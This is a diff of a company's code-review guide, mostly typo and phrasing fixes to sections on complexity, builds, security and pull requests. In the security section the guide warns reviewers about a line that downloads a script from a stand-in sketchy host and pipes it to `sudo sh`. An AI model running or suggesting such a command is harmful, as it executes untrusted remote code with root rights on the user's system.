@@ -18,17 +18,17 @@ def some_function():
   # -----------------------------------
   ...
 ```
-You get the picture. Commented out code is an arguably a bad practice since you never know if the code around it is compatible with the commented out snippet.
+You get the picture. Commented out code is an arguably a bad practice since you never know, if the code around it is compatible with the commented out snippet.
 
 Often you'll also see:
 
 ```python
-# TODO: something I'll never touch gain but I'm still
+# TODO: something I'll never touch again but I'm still
 # putting a TODO here - just in case :)
 
 ```
 
-An additional example might be something like this:
+An additional example:
 ```python
 # ---------------------------------------------
 # not used, but I'll keep it here just in case
@@ -41,7 +41,7 @@ We invented version control systems like git and mercurial so that we don't have
 
 ### 1.2. Complexity
 
-Look for and evaluate the necessity of the introduced complexity in the proposed changeset. We also have standardized metrics we can easily approximate when evaluating for complexity i.e. cyclomatic complexity being one of such metrics.
+Look for and evaluate the necessity of the introduced complexity in the proposed changeset. We also have standardized metrics that can approximate code complexity i.e. cyclomatic complexity being one of such metrics.
 
 Wikipedia's definition of [cyclomatic complexity](https://en.wikipedia.org/wiki/Cyclomatic_complexity) is *"Cyclomatic complexity is a software metric (measurement), used to indicate the complexity of a program. It is a quantitative measure of the number of linearly independent paths through a program's source code."*
 
@@ -52,7 +52,7 @@ Although we measure this via Codeclimate it's still very important that a review
 
 This applies to all aspects of structuring code into logical modules.
 
-By module we mean: functions, modules in python or go-lang, classes, something that holds lines of code together and logically separates them. If such a module is getting too large, start thinking on how to split one function into multiple function, breaking one huge source code file into a separate package etc.
+By module we mean: functions, modules in python or go-lang, classes, something that holds lines of code together and logically separates them. If such a module is getting too large, start thinking on how to split one function into multiple functions, breaking one huge source code file into a separate package etc.
 
 ### 1.4. Code Coverage
 
@@ -60,20 +60,20 @@ Make sure the newly committed code is properly tested. Writing tests alongside w
 
 ### 1.5. Breaking the Build
 
-As you'll learn in the chapter "Code Reviews at Zemanta" we use github's pull requests to review code of our peers before it get's merged into master. Alongside pull requests we also continuously test & build our code on Circle CI and the information about a build on our CI environment is also fed back to pull requests on github.
+As you'll learn in the chapter we use github's pull requests to review code of our peers before it get's merged into master. Alongside pull requests we also continuously test & build our code on Circle CI and the information about a build on our CI environment is also fed back to pull requests on github.
 
 ![](img/pull_request_success.png)
 
-When reviewing code you should never give somebody a green light, if their build is not successful since they'll not be able to deploy this code anyway and code that isn't deployable is of no value to anyone.
+When reviewing code you should never give somebody a green light, if their build is not successful since they'll not be able to deploy this code. Code that isn't deployable is of no value to anyone.
 
 ## 2. Applying the Right Technology to the Problem at Hand
 
-Sometimes a proposed changeset comes out as a beautiful piece of code that's tested, applies really good and smart coding practices and at first glance improves the overall quality of a particular module, but if it doesn't solve the problem it stated it did, it's of little to no value.
+Sometimes a proposed changeset comes out as a beautiful piece of code that's tested, applies really good and smart coding practices and at first glance improves the overall quality of a particular module, but if it doesn't solve the problem, it's of little to no value.
 
 To avoid such instances both the reviewer and the code review submitter have to play their part by:
 
 * **When submitting** a code review, make sure you provide enough context about the problem to the reviewer.
-* **When reivewing** make sure you understand what the context of the proposed changes and invest extra time into validating that the code actually solves the problem at hand correctly.
+* **When reivewing** make sure you understand the context of the proposed changes and invest extra time into validating that the code actually solves the problem at hand correctly.
 
 *Pro tip:* An even more extreme case would be that we wouldn't be solving the right problem in the first place, but that's an issue that lies higher up in the entire engineering process, but pay attention to such cases also.
 
@@ -92,9 +92,9 @@ Here is a classic:
 curl "http://sketchy-site.com/im-completely-legit.sh" | sudo sh
 ```
 
-By no means we'll be covering all possible vectors that would weaken the security of your systems, just use all your knowledge about possible attack vectors of the code your writing or reviewing and try to prevent the introduction of potentially harmful code.
+By no means we'll be covering all possible vectors that would weaken the security of our systems, just use all of your knowledge about possible attack vectors of the code your writing or reviewing and try to prevent the introduction of potentially harmful code.
 
-When submitting a code review that introduces or changes security critical code try to think who on your team has the most knowledge about a particular module or technology and would be able to detect harmful changes. Make sure they also review your code.
+When submitting a code review that introduces or changes security critical code try to think, who on your team has the most knowledge about a particular module or technology and would be able to detect harmful changes. Make sure they also review your code.
 
 ## 4. Adhering to Good and Established Code Practices and Patterns
 
@@ -106,14 +106,14 @@ There are plenty of resources out there in the form of guides, books and documen
 * expressiveness of code in general
 * ...
 
-As a general principle: **keep in mind that most probably the code you're writing will be written once and then read many times by multiple people.** It's worth insisting
+As a general principle: **keep in mind that most probably the code you're writing will be written once and then read many times by multiple people.** 
 
 Pro tip: to get you started here is a short intro to what idiomatic [Python](http://python.net/~goodger/projects/pycon/2007/idiomatic/handout.html), [Go-lang](https://golang.org/doc/effective_go.html) and [JavaScript](http://javascript.crockford.com/code.html) is.
 
 
 ## 5. Preventing Over-Engineering or Premature Optimizations
 
-Some say that premature optimizations are the root of all evil and misery in software engineering, we say it's a waste of your's and others precious time. When reviewing code, pay special attention to newly written wrappers, libraries and abstractions since they might be introduced prematurely to the codebase.
+Some say that premature optimizations are the root of all evil and misery in software engineering. We say it's a waste of your's and companies precious time. When reviewing code, pay special attention to newly written wrappers, libraries and abstractions since they might be introduced prematurely to the codebase.
 
 Also consider premature introduction of 3rd party libraries and evaluate the value that they bring to the codebase as a whole. Ask yourself, if the newly introduced library can perhaps be replaced with minimal amount of custom code?  
 
@@ -127,9 +127,9 @@ So let's follow an example changeset from it's first commit all the way to a mer
 
 ## 1. Branch off
 
-You've changed a file(s) in one of Zemanta's git repositories on github and you want to commit your code. Before you do so, make sure you've created a separate branch off master presumably. There's no need to create a private fork of our repository since it's more complicated to keep their master up to date with the origin. Once you've committed your code to this branch and pushed your newly created branch back to origin it's time to to create a **pull request (PR)** on github.
+You've changed a file(s) in one of Zemanta's git repositories on github and you want to commit your code. Before you do so, make sure you've created a separate branch. There's no need to create a private fork of our repository since it's more complicated to keep the private fork's master up to date with the origin. Once you've committed your code to this branch and pushed your newly created branch back to origin it's time to to create a **pull request (PR)** on github.
 
-Note: Please use the underscore naming convention for naming your branches i.e. `prefix_branch_name`. Use prefix fea for a new feature, fix for a bugfix, etc.
+Note: Please use the underscore naming convention for naming your branches i.e. `prefix_branch_name`. Use prefix `fea` for a new feature, `fix` for a bugfix, etc.
 
 ## 2. Pull Request
 
@@ -154,6 +154,7 @@ When submitting a PR, consider breaking down your changeset into multiple consec
 ### 2.4. Successful Build
 
 As already mentioned, we have github's PRs set up in a way that we display build status right next to your PR. The build status comes from Circle CI. So make sure your build is successful and all tests pass since a reviewer will notice it first and instruct you to fix that before continuing with the actual review.
+
 ### 2.5. Auto Code Review on Codeclimate
 
 We're also using a remote service called codeclimate (and who's feedback is also reflected on a PR) that analyzes your code and checks for code complexity, quality, etc.
